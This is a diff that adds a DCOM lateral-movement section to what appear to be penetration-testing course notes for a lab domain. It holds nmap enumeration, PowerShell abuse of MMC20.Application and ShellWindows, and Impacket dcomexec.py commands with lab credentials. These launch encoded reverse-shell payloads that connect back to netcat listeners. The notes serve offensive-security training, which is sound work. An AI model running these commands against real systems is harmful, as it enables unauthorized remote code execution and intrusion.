@@ -1562,3 +1562,176 @@ logonhours                    : {255, 255, 255, 255...}
 ...SNIP...
 ```
 
+### Distributed Component Object Model (_DCOM_)
+
+... is a Microsoft technology for software components distributed across networked computers. It extends the Component Object Model (_COM_) to support communication among objects over a network. It operates on top of the remote procedure call (_RPC_) transport protocol based on TCP/IP for its network communications. DCOM uses port 135 for the initial communication and dynamic ports in the range ? `49152-65535` for subsequent client-server interactions. Information about the identity, implementation, and configuration of each DCOM object is stored in the registry, linked to several key identifiers:
+
+- **CLSID (_Class Identifier_)**: A unique GUID for a COM class, pointing to its implementation in the registry via `InProcServer32` for DLL-based objects or `LocalServer32` for executable based objects.
+- **ProgID (_Programmatic Identifier_)**: An optional, user-friendly name for a COM class, used as an alternative to the CLSID, though it is not unique and not always present.
+- **AppID (_Application Identifier)**: Specifies configuration details for one or more COM objects within the same executable, including permissions for local and remote access.
+
+#### Rights
+
+Leveraging DCOM for lateral movement requires specific user rights and permissions. These rights ensure that users have the appropriate level of access to perform DCOM operations securely. These include general user rights such as `local and network access`, which enable communication with DCOM services locally and over a network. Additionally, membership in the `Distributed COM Users Group` or the `Administrators Group` is often required, as these groups have the necessary permissions. These settings are typically managed using the DCOM Configuration Tool (_DCOMCNFG_), Group Policy, or the Windows Registry.
+
+#### Enum
+
+You can use nmap to scan the target and identify DCOM.
+
+```bash
+d41y@htb[/htb]$ nmap -p135,49152-65535 10.129.229.244 -sCV -Pn
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-12 00:16 UTC
+Nmap scan report for srv01.inlanefreight.local (10.129.229.244)
+Host is up (0.0017s latency).
+Not shown: 16376 filtered ports
+
+PORT      STATE SERVICE VERSION
+135/tcp   open  msrpc   Microsoft Windows RPC
+49664/tcp open  msrpc   Microsoft Windows RPC
+49665/tcp open  msrpc   Microsoft Windows RPC
+49666/tcp open  msrpc   Microsoft Windows RPC
+49667/tcp open  msrpc   Microsoft Windows RPC
+49669/tcp open  msrpc   Microsoft Windows RPC
+49670/tcp open  msrpc   Microsoft Windows RPC
+49671/tcp open  msrpc   Microsoft Windows RPC
+49672/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_nbstat: NetBIOS name: SRV02, NetBIOS user: <unknown>, NetBIOS MAC: 00:0d:3a:e4:57:44 (Microsoft)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 90.52 seconds
+```
+
+#### Lateral Movement from Windows
+
+##### MMC20.Application
+
+The `MMC20.Application` object allows remote interaction with Microsoft Management Console (_MMC_), enabling you to execute commands and manage administrative tasks on a Windows system through its graphical user interface components.
+
+To use this technique, start listening with Netcat:
+
+```bash
+d41y@htb[/htb]$ nc -lnvp 8001
+Listening on 0.0.0.0 8001
+```
+
+After connecting via RDP, you must create an instance of the `MMC20.Application` object. This is done using PowerShell to interact with COM objects.
+
+```powershell
+PS C:\Tools\> $mmc = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","172.20.0.52"));
+```
+
+You create an instance of the `MMC20.Application` COM object on your target server SRV02 using PowerShell. You declare a variable `$mmc` to store this instance and use the .NET Activator class's `CreateInstance` method to initialize it. The `GetTypeFromProgID` method retrieves the type information for the MMC20.Application based on its `ProgID`, "MMC20.Application", from the remote server at `172.20.0.52`.
+
+Next, you can utilize the `ExecuteShellCommand` function within the `Document.ActiveView` property. [Microsoft documentation](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand) defines the method as follows:
+
+```
+View.ExecuteShellCommand( _
+  ByVal Command As String, _
+  ByVal Directory As String, _
+  ByVal Parameters As String, _
+  ByVal WindowState As String _
+)
+```
+
+In order to use it, you must complete all parameters. The first is the command to execute, which will be `powershell.exe`, next you set the directory to `$null`, third you add PowerShell's parameters with your reverse shell payload, and finally you set the WindowState to `0` so it will execute normally:
+
+```powershell
+PS C:\Tools\> $mmc.Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,"-e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==",0)
+```
+
+After execution, you would have successfully established a revshell connection:
+
+```bash
+d41y@htb[/htb]$ nc -lnvp 8001                                                                                  
+listening on [any] 8001 ...                                                                                    
+connect to [10.10.14.207] from (UNKNOWN) [10.129.229.245] 58400                                                                                                     
+
+PS C:\Windows\system32> whoami                                                                                 
+inlanefreight\helen
+```
+
+Execution of `mmc.exe` through COM is highly unusual, making it difficult to mask this technique as benign activity and likely to trigger alerts for defenders, but that will depend on the maturity of the organization.
+
+##### ShellWindows & ShellBrowserWindow
+
+ShellWindows and `ShellBrowserWindow` objects in DCOM are very similar, they facilitate remote interaction with Windows Explorer instances. `ShellWindows` allows enumeration and control of open windows, enabling operations such as accessing files and executing commands within the Windows shell environment. However, `ShellBrowserWindow` provides specific control over browser windows within Windows Explorer, offering capabilities for managing file operations and executing commands remotely.
+
+Since these objects aren't associated with a `ProgID`, you must employ the `Type.GetTypeFromCLSID` method in .NET along with `Activator.CreateInstance` to create an instance of the object via its `CLSID` on a remote host. You can find the `CLSID` with the following script:
+
+```powershell
+PS C:\Tools> Get-ChildItem -Path 'HKLM:\SOFTWARE\Classes\CLSID' | ForEach-Object{Get-ItemProperty -Path $_.PSPath | Where-Object {$_.'(default)' -eq 'ShellWindows'} | Select-Object -ExpandProperty PSChildName}
+
+{9BA05972-F6A8-11CF-A442-00A0C90A8F39}
+```
+
+You won't be able to use this technique in this lab because it doesn't have all the required components. However, if you find a server where those components exist, you can use this method to perform remote code execution. This technique involves instantiating the `ShellWindows` object.
+
+```powershell
+PS C:\Tools> $shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","SRV02"))
+```
+
+```powershell
+PS C:\Tools\> $shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","172.20.0.52"))
+```
+
+Start listening:
+
+```bash
+d41y@htb[/htb]$ nc -lnvp 8080
+Listening on 0.0.0.0 8080
+```
+
+After that, you can execute any command using the `ShellExecute` method of the `Document.Application` property. You will use `cmd.exe` to execute your payload. You will be using a PowerShell revshell payload.
+
+```powershell
+PS C:\Tools\> $shell[0].Document.Application.ShellExecute("cmd.exe","/c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==","C:\Windows\System32",$null,0)
+```
+
+Finally, you can confirm that you have successfully established a revshell connection:
+
+```bash
+Connection received on 172.20.0.52 50105
+
+PS C:\Windows\system32> hostname
+SRV02
+```
+
+#### Lateral Movement from Linux
+
+##### dcomexec.py
+
+`dcomexec.py` from Impacket provides an interactive shell on a remote Windows host, similar to `wmiexec.py`, but utilizes different DCOM endpoints for command execution. It operates over TCP port 445, retrieving output via the `ADMIN$` share. This tool supports DCOM objects like `MMC20.Application`, `ShellWindows`, and `ShellBrowserWindow`, offering alternative remote execution methods.
+
+You can leverage `dcomexec.py` to connect to a remote host and get code execution. Start listening:
+
+```bash
+d41y@htb[/htb]$ nc -lnvp 8080
+Listening on 0.0.0.0 8080
+```
+
+Now, you will use the user `Josias` and the password `Jonny25` to connect to SRV02, this user is a member of the `Distributed COM Users` which have the necessary permissions to execute `dcomexec.py`, you must specify the DCOM object you wish to use with `-object`, for this example, you will be using `MMC20`, after that you must specify the domain, user, and password along with the target IP address, `<domain>/<user>:<password>@<ip>`, finally, you can pass your payload:
+
+```powershell
+d41y@htb[/htb]$ proxychains4 -q python3 dcomexec.py -object MMC20 INLANEFREIGHT/Josias:Jonny25@172.20.0.52 "powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -silentcommand
+```
+
+> [!NOTE]
+> In case the TCP port 445 is not available, you can use the option `-no-output`. This will disable the output and it won't try to use port 445 for connections.
+
+As you can see, you have successfully gained access to system:
+
+```bash
+d41y@htb[/htb]$ nc -lnvp 8001
+listening on [any] 8001 ...
+connect to [10.10.14.207] from (UNKNOWN) [10.129.229.245] 49869
+
+PS C:\windows\system32> whoami
+inlanefreight\josias
+```
+
+> [!NOTE]
+> Alternatively, `dcomexec.py` also supports `ShellWindows` and `ShellBrowserWindow` objects; you can substitute MMC20 and if those are enabled, it will allow you to perform code execution.
+
